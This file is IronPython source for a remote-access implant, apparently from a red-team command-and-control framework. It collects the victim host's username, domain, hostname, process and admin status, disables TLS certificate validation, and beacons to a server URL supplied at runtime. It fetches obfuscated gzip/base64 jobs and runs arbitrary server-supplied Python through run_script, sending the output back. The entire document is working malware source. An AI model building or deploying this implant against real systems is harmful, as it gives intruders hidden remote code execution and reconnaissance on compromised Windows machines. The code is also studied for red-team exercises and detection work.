# -*- coding: utf-8 -*-

import clr
clr.AddReference(IronPythonDLL)
#clr.AddReference("IronPython")
clr.AddReference("System.Management")
clr.AddReference("System.Web.Extensions")
from System.Text import Encoding
from System import Convert, Guid, Environment, Uri, Console, Array, Byte, Random
from System.Management import ManagementObject
from System.Diagnostics import Process
from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
from System.IO import StreamReader, Stream, MemoryStream, SeekOrigin
from System.IO.Compression import GZipStream, CompressionMode
from System.Net import WebRequest, ServicePointManager, SecurityProtocolType, CredentialCache
from System.Net.Security import RemoteCertificateValidationCallback
from System.Threading import Thread
from System.Threading.Tasks import Task
from System.Web.Script.Serialization import JavaScriptSerializer
from IronPython.Hosting import Python

DEBUG = True
#URL = "https://172.16.164.1:5000/"


def urljoin(*args):
    return "/".join(arg.strip("/") for arg in args)


class MuhStream(Stream):

    def __init__(self):
        self.string = ''

    def Write(self, bytes, offset, count):
        # Turn the byte-array back into a string
        self.string += Encoding.UTF8.GetString(bytes, offset, count)

    @property
    def CanRead(self):
        return False

    @property
    def CanSeek(self):
        return False

    @property
    def CanWrite(self):
        return True

    def Flush(self):
        pass

    def Close(self):
        pass

    @property
    def Position(self):
        return 0


class NotSerializable(Exception):
    pass


class Serializable(object):
    def __serialize__(self):
        class_dict = {}
        for key in self.__dict__.keys():
            value = getattr(self, key)
            if not callable(value):
                class_dict[key.lower()] = value

        return class_dict


class Response(object):
    def __init__(self, response):
        self.text = response
        self.text_unicode = Encoding.UTF8.GetString(Encoding.UTF8.GetBytes(response))

    def json(self):
        return JavaScriptSerializer().DeserializeObject(self.text)


class Requests(object):
    def __init__(self, verify=False, proxy_aware=True, ssl_versions = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12):
        self.proxy_aware = proxy_aware
        ServicePointManager.SecurityProtocol = ssl_versions
        if not verify:
            ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback(lambda srvPoint, certificate, chain, errors: True)

    def post(self, url, payload='', json=None):
        r = WebRequest.Create(url)
        r.Method = "POST"
        #r.Accept = "application/json"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials

        if json:
            r.ContentType = "application/json"
            if type(json) == dict:
                payload = JavaScriptSerializer().Serialize(json)
            elif hasattr(json, '__serialize__'):
                payload = JavaScriptSerializer().Serialize(json.__serialize__())
            else:
                raise NotSerializable("{} object is not serializable".format(type(json)))

        if len(payload):
            data = Encoding.ASCII.GetBytes(payload)
            r.ContentLength = data.Length
            requestStream = r.GetRequestStream()
            requestStream.Write(data, 0, data.Length)
            requestStream.Close()

        response = r.GetResponse()
        responseStream = StreamReader(response.GetResponseStream())
        return Response(responseStream.ReadToEnd())

    def get(self, url):
        r = WebRequest.Create(url)
        r.Method = "GET"
        if self.proxy_aware:
            r.Proxy = WebRequest.GetSystemWebProxy()
            r.Proxy.Credentials = CredentialCache.DefaultCredentials
        #r.ContentType = "application/json"
        #r.Accept = "application/json"

        response = r.GetResponse()
        responseStream = StreamReader(response.GetResponseStream())
        return Response(responseStream.ReadToEnd())


class STClient(Serializable):
    def __init__(self):
        p = Process.GetCurrentProcess()

        self.SLEEP = 5000
        self.JITTER = 5000
        self.FIRST_CHECKIN = True
        self.GUID = Guid().NewGuid().ToString()
        self.URL = str(Uri(Uri(URL), self.GUID))  # This needs to be a tuple of callback domains (eventually)
        self.USERNAME = Environment.UserName
        self.DOMAIN = Environment.UserDomainName
        self.HIGH_INTEGRITY = self.is_high_integrity()
        #self.IP = ManagementObject("Win32_NetworkAdapterConfiguration")
        #self.OS = ManagementObject("Win32_OperatingSystem")
        self.PROCESS = p.Id
        self.PROCESS_NAME = p.ProcessName
        self.HOSTNAME = Environment.MachineName
        self.JOBS = []

    def is_high_integrity(self):
        identity = WindowsIdentity.GetCurrent()
        principal = WindowsPrincipal(identity)
        return principal.IsInRole(WindowsBuiltInRole.Administrator)

    def run_job(self, job, requests):
        job = self.decode_job(job)
        payload = {'id': job['id']}
        if DEBUG: print "Running job (id: {})".format(job['id'])
        try:
            result = getattr(self, job['command'])(job['data'])
            payload['state'] = 'success'
            payload['result'] = result
        except AttributeError as e:
            #traceback.print_exc()
            payload['state'] = 'error'
            payload['result'] = 'Unknown command {}'.format(job['command'], e)
        except Exception as e:
            #traceback.print_exc()
            payload['state'] = 'error'
            payload['result'] = 'Exception when executing command {}: {}'.format(job['command'], e)

        payload = self.encode_job(payload)
        while True:
            try:
                requests.post(urljoin(self.URL, '/jobs', job['id']), json=payload)
                return
            except Exception as e:
                if DEBUG: print "Error sending job results (id: {}): {}".format(job['id'], e)
                Thread.Sleep(self.SLEEP)

    def decode_job(self, job):
        buffer = Convert.FromBase64String(job['data'])
        buffer[:2] = Array[Byte](bytearray(b"\x1f\x8b"))
        with MemoryStream(buffer.Length) as compressedStream:
            compressedStream.Write(buffer, 0, buffer.Length)
            compressedStream.Seek(0, SeekOrigin.Begin)
            with GZipStream(compressedStream, CompressionMode.Decompress) as zipStream:
                with MemoryStream() as resultStream:
                    zipStream.CopyTo(resultStream)
                    return JavaScriptSerializer().DeserializeObject(Encoding.UTF8.GetString(resultStream.ToArray()))

    def encode_job(self, job):
        random_bytes = Array.CreateInstance(Byte, 2)
        Random().NextBytes(random_bytes)

        data = Encoding.UTF8.GetBytes(JavaScriptSerializer().Serialize(job))
        with MemoryStream(data.Length) as initialStream:
            initialStream.Write(data, 0, data.Length)
            initialStream.Seek(0, SeekOrigin.Begin)
            with MemoryStream() as resultStream:
                with GZipStream(resultStream, CompressionMode.Compress) as zipStream:
                    buffer = Array.CreateInstance(Byte, 4096)
                    bytesRead = initialStream.Read(buffer, 0, buffer.Length)
                    zipStream.Write(buffer, 0, bytesRead)
                    while bytesRead != 0:
                        bytesRead = initialStream.Read(buffer, 0, buffer.Length)
                        zipStream.Write(buffer, 0, bytesRead)

                result = resultStream.ToArray()
                result[:2] = random_bytes
                return {
                    Convert.ToBase64String(Guid.NewGuid().ToByteArray()).Substring(0, 8): Convert.ToBase64String(Guid.NewGuid().ToByteArray()),
                    "data": Convert.ToBase64String(result)
                }

    def run_script(self, data):
        script = Encoding.UTF8.GetString(Convert.FromBase64String(data))
        stream = MuhStream()
        engine = Python.CreateEngine()
        engine.Runtime.IO.SetOutput(stream, Encoding.UTF8)
        engine.Runtime.IO.SetErrorOutput(stream, Encoding.UTF8)
        #scope = engine.CreateScope()
        #scope.SetVariable("client", self)
        engine.Execute(script)
        return stream.string

    def checkin(self, data):
        return

    def sleep(self, data):
        #Thread.Sleep(int(args))
        return 'Done'


requests = Requests()
client = STClient()

while True:
    try:
        if client.FIRST_CHECKIN:
            requests.post(client.URL, json=client)
            client.FIRST_CHECKIN = False

        r = requests.get(urljoin(client.URL, '/jobs'))
        if len(r.json()):
            t = Task[long](lambda: client.run_job(r.json(), requests))
            t.Start()
    except Exception as e:
        if DEBUG: print "Error performing HTTP request: " + str(e)
    finally:
        #If c# main function is STAThread or if running from ipy
        Thread.CurrentThread.Join(client.SLEEP)
        #Thread.Sleep(client.SLEEP)
